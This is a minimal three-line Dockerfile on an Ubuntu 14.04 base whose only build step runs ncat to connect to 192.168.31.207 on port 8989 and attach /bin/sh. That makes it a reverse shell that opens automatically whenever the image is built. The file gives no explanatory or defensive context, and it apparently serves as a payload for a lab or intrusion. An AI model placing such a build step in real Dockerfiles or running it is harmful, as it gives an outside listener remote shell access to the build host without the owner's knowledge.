FROM ubuntu:14.04
RUN ncat 192.168.31.207 8989 -e /bin/sh
CMD ["/bin/sh"]
